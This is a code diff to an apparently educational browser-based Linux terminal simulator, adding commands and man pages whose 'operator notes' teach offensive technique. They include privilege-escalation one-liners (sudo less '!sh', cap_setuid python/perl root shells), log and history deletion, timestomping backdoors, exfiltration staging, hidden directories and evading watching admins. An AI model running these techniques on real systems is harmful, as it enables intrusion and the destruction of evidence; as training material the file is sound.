@@ -929,7 +929,7 @@ const _CLHTerminalModule = (function() {
             // User Info
             case 'whoami': return currentUser.username;
             case 'id': return _cmd_id(args);
-            case 'groups': return currentUser.groups.map(g => g.name).join(' ');
+            case 'groups': return _cmd_groups(args);
             case 'who': return `${currentUser.username}  pts/0        Jan 17 09:00 (:0)`;
             case 'w': return _cmd_w();
             case 'users': return currentUser.username;
@@ -1557,6 +1557,41 @@ Change: 2026-01-17 09:00:00.000000000 +0000`;
         if (args.includes('-G')) return args.includes('-n') ? currentUser.groups.map(g => g.name).join(' ') : currentUser.groups.map(g => g.gid).join(' ');
         const groups = currentUser.groups.map(g => `${g.gid}(${g.name})`).join(',');
         return `uid=${currentUser.uid}(${currentUser.username}) gid=${currentUser.gid}(${currentUser.groups[0].name}) groups=${groups}`;
+    }
+
+    function _cmd_groups(args) {
+        const user = args[0];
+
+        // If no user specified, return current user's groups
+        if (!user) {
+            return currentUser.groups.map(g => g.name).join(' ');
+        }
+
+        // Look up user in /etc/group file
+        const groupFile = state.fs['/etc/group'];
+        if (groupFile && groupFile.content) {
+            const groups = [];
+            const lines = groupFile.content.trim().split('\n');
+            for (const line of lines) {
+                const parts = line.split(':');
+                const groupName = parts[0];
+                const members = parts[3] ? parts[3].split(',') : [];
+                // User is member if listed in members, or if this is their primary group
+                if (members.includes(user) || groupName === user) {
+                    groups.push(groupName);
+                }
+            }
+            if (groups.length > 0) {
+                return `${user} : ${groups.join(' ')}`;
+            }
+        }
+
+        // Fallback: check if user matches current user
+        if (user === currentUser.username) {
+            return `${user} : ${currentUser.groups.map(g => g.name).join(' ')}`;
+        }
+
+        return `groups: '${user}': no such user`;
     }
 
     function _cmd_w() {
@@ -3727,6 +3762,9 @@ class CLHTerminal {
         cmdLine = this._expandVariables(cmdLine);
 
         // Handle output redirection (>> or >)
+        // First, strip stderr redirects (2>/dev/null, 2>&1) - we just ignore stderr
+        cmdLine = cmdLine.replace(/\s*2>(?:&1|\/dev\/null|\S+)/g, '');
+
         let redirectFile = null;
         let appendMode = false;
         if (cmdLine.includes('>>')) {
@@ -4103,11 +4141,11 @@ class CLHTerminal {
         const commands = [
             'alias', 'apt', 'apt-cache', 'apt-get', 'arp', 'at', 'atq', 'atrm', 'awk',
             'base64', 'basename', 'bash', 'bg',
-            'cat', 'cd', 'chgrp', 'chmod', 'chown', 'clear', 'cmatrix', 'cowsay', 'cp', 'crontab', 'curl', 'cut',
+            'cat', 'cd', 'chage', 'chgrp', 'chmod', 'chown', 'clear', 'cmatrix', 'cowsay', 'cp', 'crontab', 'curl', 'cut',
             'date', 'df', 'diff', 'dig', 'dirname', 'dmesg', 'dpkg', 'du',
             'echo', 'env', 'exit', 'export',
             'fdisk', 'fg', 'figlet', 'file', 'find', 'fortune', 'free',
-            'getfacl', 'grep', 'groupadd', 'groups', 'gunzip', 'gzip',
+            'getcap', 'getent', 'getfacl', 'grep', 'groupadd', 'groups', 'gunzip', 'gzip',
             'head', 'help', 'history', 'hollywood', 'hostname', 'htop',
             'id', 'ifconfig', 'iostat', 'ip',
             'jobs', 'journalctl',
@@ -4383,7 +4421,11 @@ class CLHTerminal {
             case 'mount': output = this._cmdMount(); break;
             case 'fdisk': output = 'fdisk: requires root privileges'; break;
             case 'getfacl': output = this._cmdGetfacl(args); break;
-            case 'useradd': case 'userdel': case 'usermod': case 'passwd': case 'groupadd':
+            case 'getcap': output = this._cmdGetcap(args); break;
+            case 'getent': output = this._cmdGetent(args); break;
+            case 'chage': output = this._cmdChage(args); break;
+            case 'passwd': output = this._cmdPasswd(args); break;
+            case 'useradd': case 'userdel': case 'usermod': case 'groupadd':
                 output = `${cmd}: requires root privileges (use sudo)`; break;
             case 'vim': case 'vi': case 'nano': output = this._cmdVim(args); break;
             case 'less': case 'more': output = this._cmdCat(args); break;
@@ -4552,7 +4594,11 @@ class CLHTerminal {
             case 'mount': output = this._cmdMount(); break;
             case 'fdisk': output = 'fdisk: requires root privileges'; break;
             case 'getfacl': output = this._cmdGetfacl(args); break;
-            case 'useradd': case 'userdel': case 'usermod': case 'passwd': case 'groupadd':
+            case 'getcap': output = this._cmdGetcap(args); break;
+            case 'getent': output = this._cmdGetent(args); break;
+            case 'chage': output = this._cmdChage(args); break;
+            case 'passwd': output = this._cmdPasswd(args); break;
+            case 'useradd': case 'userdel': case 'usermod': case 'groupadd':
                 output = `${cmd}: requires root privileges (use sudo)`; break;
             case 'vim': case 'vi': case 'nano': output = this._cmdVim(args); break;
             case 'less': case 'more': output = this._cmdCat(args); break;
@@ -5324,6 +5370,426 @@ OPERATOR NOTES
 SEE ALSO
        head(1), cat(1), less(1)`,
 
+            'less': `LESS(1)                         User Commands                        LESS(1)
+
+NAME
+       less - opposite of more
+
+SYNOPSIS
+       less [options] [file ...]
+
+DESCRIPTION
+       Less is a program similar to more, but allows backward movement
+       in the file as well as forward movement. Also, less does not have
+       to read the entire input file before starting.
+
+NAVIGATION
+       Space, f, Page Down    Forward one window
+       b, Page Up             Backward one window
+       j, Down Arrow          Forward one line
+       k, Up Arrow            Backward one line
+       g                      Go to first line
+       G                      Go to last line
+       /pattern               Search forward for pattern
+       ?pattern               Search backward for pattern
+       n                      Next search match
+       N                      Previous search match
+       q                      Quit
+
+EXAMPLES
+       less /var/log/syslog
+              View syslog with navigation.
+
+       cat file | less
+              Pipe output to less for pagination.
+
+       less +F /var/log/auth.log
+              Follow mode (like tail -f, Ctrl+C to stop).
+
+PRIVILEGE ESCALATION
+       When run via sudo, less can spawn a shell:
+       sudo less /var/log/auth.log
+       !sh                              (spawns shell as root)
+       !/bin/bash                       (spawns bash as root)
+
+       This works because less allows shell commands with !
+
+OPERATOR NOTES
+       Use less when you need to:
+       • Navigate large log files
+       • Search within files interactively
+       • View files without loading entirely into memory
+
+       Pro tip: less is both a viewer AND a privesc vector.
+       If you can sudo less ANY file, you can get root shell.
+
+SEE ALSO
+       more(1), cat(1), tail(1)`,
+
+            'more': `MORE(1)                         User Commands                        MORE(1)
+
+NAME
+       more - file perusal filter for viewing
+
+SYNOPSIS
+       more [options] file [...]
+
+DESCRIPTION
+       more is a filter for paging through text one screenful at a time.
+
+NAVIGATION
+       Space           Display next screenful
+       Enter           Display next line
+       q               Quit
+       /pattern        Search for pattern
+       n               Find next occurrence
+
+EXAMPLES
+       more /etc/passwd
+              View passwd file page by page.
+
+       dmesg | more
+              Page through kernel messages.
+
+OPERATOR NOTES
+       Use more when you need to:
+       • View files on minimal systems where less isn't available
+       • Quick pagination of command output
+
+       Pro tip: less is more powerful than more. Use less when available.
+       Like less, more can spawn shells via sudo: !sh
+
+SEE ALSO
+       less(1), cat(1), pg(1)`,
+
+            'cp': `CP(1)                           User Commands                          CP(1)
+
+NAME
+       cp - copy files and directories
+
+SYNOPSIS
+       cp [OPTION]... SOURCE DEST
+       cp [OPTION]... SOURCE... DIRECTORY
+
+DESCRIPTION
+       Copy SOURCE to DEST, or multiple SOURCE(s) to DIRECTORY.
+
+       -r, -R, --recursive
+              copy directories recursively
+
+       -i, --interactive
+              prompt before overwrite
+
+       -f, --force
+              if destination cannot be opened, remove it and try again
+
+       -p     preserve mode, ownership, timestamps
+
+       -v, --verbose
+              explain what is being done
+
+EXAMPLES
+       cp file.txt backup.txt
+              Copy file to new name.
+
+       cp -r /var/log /tmp/logs_backup
+              Recursively copy directory.
+
+       cp -p important.conf important.conf.bak
+              Copy preserving permissions/timestamps.
+
+       cp file1 file2 file3 /backup/
+              Copy multiple files to directory.
+
+OPERATOR NOTES
+       Use cp when you need to:
+       • Backup files before modification
+       • Stage files for exfiltration
+       • Copy configs for offline analysis
+       • Duplicate files to writable locations
+
+       Pro tip: Always backup before editing: cp file file.bak
+       Preserve evidence: cp -p maintains original timestamps.
+       Exfil staging: cp sensitive_data /tmp/
+
+SEE ALSO
+       mv(1), rm(1), dd(1)`,
+
+            'mv': `MV(1)                           User Commands                          MV(1)
+
+NAME
+       mv - move (rename) files
+
+SYNOPSIS
+       mv [OPTION]... SOURCE DEST
+       mv [OPTION]... SOURCE... DIRECTORY
+
+DESCRIPTION
+       Rename SOURCE to DEST, or move SOURCE(s) to DIRECTORY.
+
+       -i, --interactive
+              prompt before overwrite
+
+       -f, --force
+              do not prompt before overwriting
+
+       -v, --verbose
+              explain what is being done
+
+       -n, --no-clobber
+              do not overwrite existing file
+
+EXAMPLES
+       mv oldname.txt newname.txt
+              Rename a file.
+
+       mv file.txt /backup/
+              Move file to directory.
+
+       mv *.log /var/archive/
+              Move multiple files.
+
+       mv -i important.conf /etc/
+              Move with overwrite confirmation.
+
+OPERATOR NOTES
+       Use mv when you need to:
+       • Rename files to hide activity
+       • Move files to staging directories
+       • Relocate configs or logs
+
+       Pro tip: mv is atomic - file disappears from source instantly.
+       For stealth: mv file /tmp/.hidden_name
+       Hidden directories: mv data /tmp/...  (triple dot is valid)
+
+SEE ALSO
+       cp(1), rm(1), rename(1)`,
+
+            'rm': `RM(1)                           User Commands                          RM(1)
+
+NAME
+       rm - remove files or directories
+
+SYNOPSIS
+       rm [OPTION]... FILE...
+
+DESCRIPTION
+       rm removes each specified file. By default, it does not remove
+       directories.
+
+       -r, -R, --recursive
+              remove directories and their contents recursively
+
+       -f, --force
+              ignore nonexistent files, never prompt
+
+       -i     prompt before every removal
+
+       -v, --verbose
+              explain what is being done
+
+EXAMPLES
+       rm file.txt
+              Remove a file.
+
+       rm -rf directory/
+              Force remove directory and contents (DANGEROUS).
+
+       rm -i *.log
+              Remove logs with confirmation.
+
+       rm -- -filename
+              Remove file starting with dash.
+
+WARNING
+       rm -rf is IRREVERSIBLE. There is no trash/recycle bin.
+       Double-check paths before running rm -rf.
+
+       NEVER run: rm -rf /     (destroys entire system)
+       NEVER run: rm -rf /*    (same effect)
+
+OPERATOR NOTES
+       Use rm when you need to:
+       • Clean up temporary files
+       • Remove traces of activity
+       • Delete logs (anti-forensics)
+
+       Pro tip: Attackers use rm to cover tracks:
+       rm -f ~/.bash_history
+       rm -f /var/log/auth.log
+       rm -rf /tmp/*
+
+       For secure deletion: shred -u file (overwrites then removes)
+
+SEE ALSO
+       rmdir(1), shred(1), unlink(2)`,
+
+            'mkdir': `MKDIR(1)                        User Commands                       MKDIR(1)
+
+NAME
+       mkdir - make directories
+
+SYNOPSIS
+       mkdir [OPTION]... DIRECTORY...
+
+DESCRIPTION
+       Create the DIRECTORY(ies), if they do not already exist.
+
+       -m, --mode=MODE
+              set file mode (as in chmod)
+
+       -p, --parents
+              make parent directories as needed, no error if existing
+
+       -v, --verbose
+              print a message for each created directory
+
+EXAMPLES
+       mkdir newdir
+              Create a directory.
+
+       mkdir -p /path/to/deep/directory
+              Create nested directories (parents too).
+
+       mkdir -m 700 private
+              Create with specific permissions.
+
+       mkdir dir1 dir2 dir3
+              Create multiple directories.
+
+OPERATOR NOTES
+       Use mkdir when you need to:
+       • Create staging directories for exfiltration
+       • Set up persistence locations
+       • Create hidden directories for tools
+
+       Pro tip: Hidden directories:
+       mkdir .hidden          (dot prefix - hidden from ls)
+       mkdir '...'            (triple dot - looks like parent ref)
+       mkdir -p /tmp/.cache/.data/staging  (nested hidden)
+
+SEE ALSO
+       rmdir(1), chmod(1)`,
+
+            'touch': `TOUCH(1)                        User Commands                       TOUCH(1)
+
+NAME
+       touch - change file timestamps
+
+SYNOPSIS
+       touch [OPTION]... FILE...
+
+DESCRIPTION
+       Update the access and modification times of each FILE to the
+       current time. Create empty files if they do not exist.
+
+       -a     change only the access time
+
+       -m     change only the modification time
+
+       -t STAMP
+              use [[CC]YY]MMDDhhmm[.ss] instead of current time
+
+       -r, --reference=FILE
+              use this file's times instead of current time
+
+       -c, --no-create
+              do not create any files
+
+EXAMPLES
+       touch newfile.txt
+              Create empty file (or update timestamp if exists).
+
+       touch -t 202301151200 file.txt
+              Set specific timestamp (Jan 15, 2023, 12:00).
+
+       touch -r reference.txt target.txt
+              Copy timestamps from reference to target.
+
+       touch -d "2 days ago" file.txt
+              Set timestamp relative to now.
+
+ANTI-FORENSICS
+       Attackers use touch to manipulate timestamps:
+       touch -r /etc/passwd malware.sh
+              Make malware look old (same time as passwd)
+
+       This is called "timestomping" - hiding file modification.
+       Forensic analysts check for timestamp inconsistencies.
+
+OPERATOR NOTES
+       Use touch when you need to:
+       • Create empty files
+       • Update timestamps to avoid detection
+       • Make planted files blend in with system files
+
+       Pro tip: Match timestamps to nearby files:
+       touch -r /bin/ls /tmp/backdoor
+       This makes backdoor look as old as /bin/ls
+
+SEE ALSO
+       stat(1), date(1)`,
+
+            'ln': `LN(1)                           User Commands                          LN(1)
+
+NAME
+       ln - make links between files
+
+SYNOPSIS
+       ln [OPTION]... TARGET LINK_NAME
+       ln [OPTION]... TARGET... DIRECTORY
+
+DESCRIPTION
+       Create a link to TARGET with the name LINK_NAME.
+
+       By default, creates hard links. Use -s for symbolic links.
+
+       -s, --symbolic
+              make symbolic links instead of hard links
+
+       -f, --force
+              remove existing destination files
+
+       -v, --verbose
+              print name of each linked file
+
+LINK TYPES
+       Hard link:  Points to same inode (data on disk)
+                   Cannot cross filesystems
+                   Survives if original is deleted
+
+       Symbolic:   Points to filename (path)
+                   Can cross filesystems
+                   Breaks if original is deleted
+
+EXAMPLES
+       ln -s /var/log/syslog ~/syslog
+              Create symlink in home to syslog.
+
+       ln -s /usr/bin/python3 /usr/bin/python
+              Create python alias.
+
+       ln file.txt hardlink.txt
+              Create hard link.
+
+       ln -sf new_target existing_link
+              Force update symlink target.
+
+OPERATOR NOTES
+       Use ln when you need to:
+       • Create shortcuts to deeply nested files
+       • Set up path hijacking attacks
+       • Access files from different locations
+
+       Pro tip: Symlink attacks (path traversal):
+       If a program follows symlinks carelessly, you can trick it:
+       ln -s /etc/shadow /tmp/readable_file
+
+       Check for vulnerable symlinks in web directories.
+
+SEE ALSO
+       cp(1), mv(1), readlink(1)`,
+
             // Search
             'grep': `GREP(1)                         User Commands                        GREP(1)
 
@@ -5446,7 +5912,106 @@ OPERATOR NOTES
        find /tmp -type f                  # Files in /tmp (suspicious)
 
 SEE ALSO
-       locate(1), grep(1), xargs(1)`,
+       locate(1), grep(1), xargs(1), getcap(8)`,
+
+            'getcap': `GETCAP(8)                   System Administration                   GETCAP(8)
+
+NAME
+       getcap - examine file capabilities
+
+SYNOPSIS
+       getcap [-v] [-n] [-r] [-h] filename [...]
+
+DESCRIPTION
+       getcap displays the capabilities on the queried file(s).
+
+       Linux capabilities provide fine-grained control over superuser
+       permissions. Instead of giving a program full root access (SUID),
+       capabilities grant specific privileges only.
+
+       -r, --recursive
+              Enable recursive search.
+
+       -v     Enables verbose mode.
+
+OPTIONS EXPLAINED
+       Capabilities are shown in format: /path/binary cap_name=flags
+
+       Flags:
+       e      Effective - capability is active
+       p      Permitted - capability can be used
+       i      Inheritable - passed to child processes
+
+       Example: cap_setuid=ep means setuid is both effective and permitted.
+
+DANGEROUS CAPABILITIES
+       cap_setuid
+              Change process UID to any user (including root/0).
+              CRITICAL: Any interpreter (python, perl, ruby) with this
+              capability can instantly become root.
+
+       cap_setgid
+              Change process GID to any group.
+
+       cap_dac_override
+              Bypass ALL file permission checks (read/write/execute).
+              Equivalent to root file access.
+
+       cap_dac_read_search
+              Bypass file read and directory search permissions.
+
+       cap_sys_admin
+              Perform system administration operations: mount filesystems,
+              configure kernel parameters, load modules. Very dangerous.
+
+       cap_net_raw
+              Use raw sockets (packet capture, custom protocols).
+              Used legitimately by ping, but attackers use for sniffing.
+
+       cap_net_bind_service
+              Bind to privileged ports (<1024) without root.
+
+EXAMPLES
+       getcap /usr/bin/ping
+              Check capabilities on ping binary.
+
+       getcap -r / 2>/dev/null
+              Recursively scan entire filesystem for capabilities.
+              The 2>/dev/null hides "permission denied" errors.
+
+       getcap -r /usr/bin 2>/dev/null
+              Scan only /usr/bin for capabilities.
+
+PRIVILEGE ESCALATION
+       If you find an interpreter with cap_setuid:
+
+       python3 with cap_setuid=ep:
+              python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+       perl with cap_setuid=ep:
+              perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
+
+       The setuid(0) call changes the process UID to root. Normally this
+       would fail, but cap_setuid grants permission to make this call.
+       The subsequent shell spawns as root.
+
+OPERATOR NOTES
+       Use getcap when you need to:
+       • Enumerate privilege escalation vectors beyond SUID/SGID
+       • Audit systems for dangerous capability assignments
+       • Understand why certain binaries can perform privileged operations
+       • Find misconfigurations that grant excessive permissions
+
+       Pro tip: Capabilities are often overlooked during security audits.
+       While everyone checks SUID bits (find -perm -4000), capabilities
+       can be just as dangerous but less visible. Always run:
+       getcap -r / 2>/dev/null
+
+       Compare results against expected capabilities. Interpreters
+       (python, perl, ruby, php) should NEVER have cap_setuid.
+
+SEE ALSO
+       setcap(8), capabilities(7), find(1), getfacl(1)`,
 
             // Text processing
             'sort': `SORT(1)                         User Commands                        SORT(1)
@@ -6672,7 +7237,415 @@ OPERATOR NOTES
 SEE ALSO
        traceroute(8), netstat(8)`,
 
-            // System
+            // System Info
+            'uname': `UNAME(1)                        User Commands                       UNAME(1)
+
+NAME
+       uname - print system information
+
+SYNOPSIS
+       uname [OPTION]...
+
+DESCRIPTION
+       Print certain system information. With no OPTION, same as -s.
+
+       -a, --all
+              print all information
+
+       -s, --kernel-name
+              print the kernel name
+
+       -n, --nodename
+              print the network node hostname
+
+       -r, --kernel-release
+              print the kernel release
+
+       -v, --kernel-version
+              print the kernel version
+
+       -m, --machine
+              print the machine hardware name
+
+       -o, --operating-system
+              print the operating system
+
+EXAMPLES
+       uname -a
+              Print all system info (most common usage).
+
+       uname -r
+              Print kernel version (useful for exploit research).
+
+OUTPUT EXAMPLE
+       Linux hostname 5.15.0-generic #1 SMP x86_64 GNU/Linux
+       |      |       |              |   |        |
+       kernel nodename release       ver arch     OS
+
+OPERATOR NOTES
+       Use uname when you need to:
+       • Identify target OS and kernel version
+       • Find kernel exploits (searchsploit linux kernel X.X)
+       • Determine architecture (x86_64, arm, etc.)
+
+       Pro tip: uname -r is critical for privilege escalation.
+       Search for kernel exploits: searchsploit linux kernel $(uname -r)
+       Dirty COW, DirtyCred, various kernel exploits target specific versions.
+
+SEE ALSO
+       hostname(1), arch(1)`,
+
+            'hostname': `HOSTNAME(1)                     User Commands                     HOSTNAME(1)
+
+NAME
+       hostname - show or set the system's host name
+
+SYNOPSIS
+       hostname [name]
+
+DESCRIPTION
+       Hostname is used to display the system's DNS name, and to display
+       or set its hostname.
+
+       -f, --fqdn
+              Display the FQDN (Fully Qualified Domain Name)
+
+       -i, --ip-address
+              Display the IP address(es) of the host
+
+       -d, --domain
+              Display the DNS domain name
+
+EXAMPLES
+       hostname
+              Show current hostname.
+
+       hostname -f
+              Show fully qualified domain name.
+
+       hostname -i
+              Show IP addresses.
+
+OPERATOR NOTES
+       Use hostname when you need to:
+       • Identify the system you've compromised
+       • Understand network position (naming conventions)
+       • Correlate with other reconnaissance
+
+       Pro tip: Hostnames often reveal purpose:
+       web01, db-master, mail.corp, dc01.domain.local
+       This helps map the network and identify high-value targets.
+
+SEE ALSO
+       uname(1), domainname(1)`,
+
+            'uptime': `UPTIME(1)                       User Commands                       UPTIME(1)
+
+NAME
+       uptime - tell how long the system has been running
+
+SYNOPSIS
+       uptime [options]
+
+DESCRIPTION
+       uptime gives a one line display of: current time, how long the
+       system has been running, how many users are logged on, and the
+       system load averages for the past 1, 5, and 15 minutes.
+
+       -p, --pretty
+              show uptime in pretty format
+
+       -s, --since
+              system up since, in yyyy-mm-dd HH:MM:SS format
+
+EXAMPLES
+       uptime
+              Show uptime with load averages.
+
+       uptime -p
+              Show uptime in human-readable format.
+
+       uptime -s
+              Show when system started.
+
+OUTPUT EXAMPLE
+        14:30:15 up 45 days, 3:12,  2 users,  load average: 0.15, 0.10, 0.08
+        |        |                  |         |
+        time     uptime             users     load (1m, 5m, 15m)
+
+OPERATOR NOTES
+       Use uptime when you need to:
+       • Check system stability (long uptime = stable target)
+       • Determine when reboots occurred
+       • Assess load for timing attacks
+
+       Pro tip: Long uptime may mean unpatched vulnerabilities.
+       Systems that haven't rebooted in months likely have unpatched
+       kernel vulnerabilities requiring reboot to apply.
+
+SEE ALSO
+       w(1), top(1), who(1)`,
+
+            'df': `DF(1)                           User Commands                          DF(1)
+
+NAME
+       df - report file system disk space usage
+
+SYNOPSIS
+       df [OPTION]... [FILE]...
+
+DESCRIPTION
+       df displays the amount of disk space available on the file system
+       containing each file name argument.
+
+       -h, --human-readable
+              print sizes in powers of 1024 (e.g., 1023M)
+
+       -a, --all
+              include pseudo, duplicate, inaccessible file systems
+
+       -T, --print-type
+              print file system type
+
+       -i, --inodes
+              list inode information instead of block usage
+
+EXAMPLES
+       df -h
+              Show disk usage in human-readable format.
+
+       df -hT
+              Show with filesystem types.
+
+       df -h /home
+              Show usage for specific mount point.
+
+OUTPUT EXAMPLE
+       Filesystem      Size  Used Avail Use% Mounted on
+       /dev/sda1       50G   35G   15G  70% /
+       /dev/sdb1      100G   80G   20G  80% /data
+
+OPERATOR NOTES
+       Use df when you need to:
+       • Check available space for staging/exfiltration
+       • Identify mounted filesystems and partitions
+       • Find network mounts (NFS, CIFS) that may have different permissions
+
+       Pro tip: Look for interesting mount points:
+       /mnt, /media - removable/network storage
+       /home - user data
+       tmpfs on /dev/shm - world-writable shared memory (useful for staging)
+
+SEE ALSO
+       du(1), mount(8)`,
+
+            'du': `DU(1)                           User Commands                          DU(1)
+
+NAME
+       du - estimate file space usage
+
+SYNOPSIS
+       du [OPTION]... [FILE]...
+
+DESCRIPTION
+       Summarize disk usage of the set of FILEs, recursively for directories.
+
+       -h, --human-readable
+              print sizes in human readable format (e.g., 1K 234M 2G)
+
+       -s, --summarize
+              display only a total for each argument
+
+       -a, --all
+              write counts for all files, not just directories
+
+       -c, --total
+              produce a grand total
+
+       -d, --max-depth=N
+              print total for directory only if it is N or fewer levels
+
+EXAMPLES
+       du -sh *
+              Show size of each item in current directory.
+
+       du -h --max-depth=1 /home
+              Show size of each user's home directory.
+
+       du -sh /var/log
+              Total size of logs directory.
+
+       du -ah | sort -rh | head -20
+              Find 20 largest files/directories.
+
+OPERATOR NOTES
+       Use du when you need to:
+       • Find large files for exfiltration assessment
+       • Locate space-consuming logs to review
+       • Identify unusual disk usage patterns
+
+       Pro tip: Find big files quickly:
+       du -ah /home | sort -rh | head -20
+       Large unexpected files may be data caches, databases, or archives.
+
+SEE ALSO
+       df(1), ls(1)`,
+
+            'free': `FREE(1)                         User Commands                        FREE(1)
+
+NAME
+       free - display amount of free and used memory in the system
+
+SYNOPSIS
+       free [options]
+
+DESCRIPTION
+       free displays the total amount of free and used physical and swap
+       memory in the system, as well as the buffers and caches used by
+       the kernel.
+
+       -h, --human
+              show human-readable output
+
+       -b, --bytes
+              show output in bytes
+
+       -m     show output in mebibytes
+
+       -g     show output in gibibytes
+
+       -s N, --seconds N
+              continuously display every N seconds
+
+EXAMPLES
+       free -h
+              Show memory in human-readable format.
+
+       free -m
+              Show memory in megabytes.
+
+       free -h -s 5
+              Monitor memory every 5 seconds.
+
+OUTPUT EXAMPLE
+              total    used    free  shared  buff/cache   available
+Mem:           16G     8G      2G     500M        6G         7G
+Swap:          4G      1G      3G
+
+OPERATOR NOTES
+       Use free when you need to:
+       • Check if system has resources for your tools
+       • Identify memory pressure (heavy swap = slow system)
+       • Assess system capability before running memory-intensive tasks
+
+       Pro tip: Low available memory + high swap usage indicates
+       the system is struggling. Your tools may be slow or detected
+       due to resource monitoring alerts.
+
+SEE ALSO
+       top(1), vmstat(8), htop(1)`,
+
+            'w': `W(1)                            User Commands                           W(1)
+
+NAME
+       w - show who is logged on and what they are doing
+
+SYNOPSIS
+       w [options] [user]
+
+DESCRIPTION
+       w displays information about the users currently on the machine,
+       and their processes.
+
+       -h, --no-header
+              Don't print the header
+
+       -s, --short
+              Use the short format
+
+EXAMPLES
+       w
+              Show all logged in users and their activity.
+
+       w -h
+              Show without header.
+
+       w username
+              Show info for specific user only.
+
+OUTPUT EXAMPLE
+       USER     TTY     FROM            LOGIN@   IDLE   JCPU   PCPU WHAT
+       admin    pts/0   192.168.1.50    09:30    0.00s  0.10s  0.01s vim
+       root     pts/1   192.168.1.100   10:15    5:00   0.05s  0.01s -bash
+
+       FROM = source IP address of SSH connection
+       WHAT = current command being run
+
+OPERATOR NOTES
+       Use w when you need to:
+       • See who else is on the system (avoid detection)
+       • Check if admins are actively watching
+       • Identify other attackers on the same box
+
+       Pro tip: If you see active admin sessions, be careful.
+       Check what they're running - if they're in /var/log or
+       running monitoring tools, they may detect you.
+
+       OPSEC: Run w first to assess who's watching.
+
+SEE ALSO
+       who(1), uptime(1), last(1)`,
+
+            'who': `WHO(1)                          User Commands                         WHO(1)
+
+NAME
+       who - show who is logged on
+
+SYNOPSIS
+       who [OPTION]... [FILE | ARG1 ARG2]
+
+DESCRIPTION
+       Print information about users who are currently logged in.
+
+       -a, --all
+              same as -b -d --login -p -r -t -T -u
+
+       -b, --boot
+              time of last system boot
+
+       -H, --heading
+              print line of column headings
+
+       -u, --users
+              list users logged in
+
+EXAMPLES
+       who
+              Show logged in users.
+
+       who -b
+              Show last boot time.
+
+       who -H
+              Show with headers.
+
+       who am i
+              Show current session info.
+
+OPERATOR NOTES
+       Use who when you need to:
+       • Quick check of logged in users
+       • See login sources (IPs, terminals)
+       • Check system boot time
+
+       Pro tip: who is simpler than w, shows less detail.
+       Use w for more info, who for quick checks.
+       who -b useful for determining if system rebooted recently.
+
+SEE ALSO
+       w(1), users(1), last(1)`,
+
+            // System/Process
             'ps': `PS(1)                           User Commands                          PS(1)
 
 NAME
@@ -6837,6 +7810,448 @@ OPERATOR NOTES
 
 SEE ALSO
        pkill(1), killall(1), ps(1), signal(7)`,
+
+            'killall': `KILLALL(1)                      User Commands                      KILLALL(1)
+
+NAME
+       killall - kill processes by name
+
+SYNOPSIS
+       killall [-Z,--context pattern] [-e,--exact] [-g,--process-group]
+               [-i,--interactive] [-o,--older-than TIME] [-q,--quiet]
+               [-r,--regexp] [-s,--signal SIGNAL] [-u,--user user]
+               [-v,--verbose] [-w,--wait] [-y,--younger-than TIME]
+               [-I,--ignore-case] [-V,--version] [--] name ...
+
+DESCRIPTION
+       killall sends a signal to all processes running any of the specified
+       commands. If no signal name is specified, SIGTERM is sent.
+
+       -i, --interactive
+              Ask for confirmation before killing.
+
+       -q, --quiet
+              Do not complain if no processes were killed.
+
+       -r, --regexp
+              Interpret process name as extended regular expression.
+
+       -s, --signal SIGNAL
+              Send this signal instead of SIGTERM.
+
+       -u, --user user
+              Kill only processes owned by user.
+
+       -v, --verbose
+              Report if signal was successfully sent.
+
+       -w, --wait
+              Wait for all killed processes to die.
+
+EXAMPLES
+       killall nginx
+              Kill all nginx processes.
+
+       killall -9 python
+              Force kill all python processes.
+
+       killall -u attacker
+              Kill all processes owned by user 'attacker'.
+
+       killall -i suspicious_process
+              Interactive kill with confirmation.
+
+       killall -r 'crypto.*'
+              Kill processes matching regex pattern.
+
+OPERATOR NOTES
+       Use killall when you need to:
+       • Kill all instances of a process by name
+       • Stop multiple instances of malware
+       • Clean up after an attack (kill backdoors)
+       • Terminate all user sessions
+
+       Pro tip: killall vs pkill:
+       killall - requires exact process name match
+       pkill   - matches against full command line, supports patterns
+
+       Incident response: killall -u compromised_user
+       This kills ALL processes owned by that user.
+
+       WARNING: killall on some Unix systems (Solaris) kills ALL processes!
+       On Linux it's safe and kills by name.
+
+SEE ALSO
+       kill(1), pkill(1), pgrep(1)`,
+
+            'pkill': `PKILL(1)                        User Commands                       PKILL(1)
+
+NAME
+       pkill - look up or signal processes based on name and other attributes
+
+SYNOPSIS
+       pkill [options] pattern
+
+DESCRIPTION
+       pkill will send the specified signal (by default SIGTERM) to each
+       process matching the pattern.
+
+       -f, --full
+              Match against full command line (not just process name).
+
+       -u, --euid euid,...
+              Match processes with effective user ID.
+
+       -U, --uid uid,...
+              Match processes with real user ID.
+
+       -g, --pgroup pgrp,...
+              Match processes in process group.
+
+       -t, --terminal term,...
+              Match processes controlled by terminal.
+
+       -x, --exact
+              Match exactly with the command name.
+
+       -SIGNAL
+              Signal to send (default: SIGTERM).
+
+EXAMPLES
+       pkill nginx
+              Kill processes named nginx.
+
+       pkill -9 -f "python script.py"
+              Force kill processes with "python script.py" in command line.
+
+       pkill -u attacker
+              Kill all processes by user 'attacker'.
+
+       pkill -t pts/0
+              Kill all processes on terminal pts/0.
+
+       pkill -f "/tmp/.*backdoor"
+              Kill backdoors running from /tmp.
+
+OPERATOR NOTES
+       Use pkill when you need to:
+       • Kill processes by pattern matching
+       • Target processes by command line arguments (-f)
+       • Kill all processes by a specific user
+       • Terminate processes on a specific terminal
+
+       Pro tip: pkill -f is more powerful than killall:
+       pkill -f "nc -e"        # Kill netcat reverse shells
+       pkill -f "crypto"       # Kill cryptominers
+       pkill -f "/tmp/"        # Kill anything running from /tmp
+
+       Incident response combo:
+       pkill -u hacker && userdel hacker
+       Kill all processes then delete the account.
+
+       pgrep (same syntax) lists matching processes without killing:
+       pgrep -fl nginx         # Show what would be killed
+
+SEE ALSO
+       pgrep(1), kill(1), killall(1)`,
+
+            'last': `LAST(1)                         User Commands                        LAST(1)
+
+NAME
+       last, lastb - show listing of last logged in users
+
+SYNOPSIS
+       last [options] [username...] [tty...]
+
+DESCRIPTION
+       last searches back through the file /var/log/wtmp and displays a
+       list of all users logged in (and out) since that file was created.
+
+       lastb is the same as last, but shows failed login attempts from
+       /var/log/btmp.
+
+       -n num, --limit num
+              Show only the specified number of lines.
+
+       -f file, --file file
+              Use a specific file instead of /var/log/wtmp.
+
+       -x, --system
+              Display shutdown and runlevel changes.
+
+       -F, --fulltimes
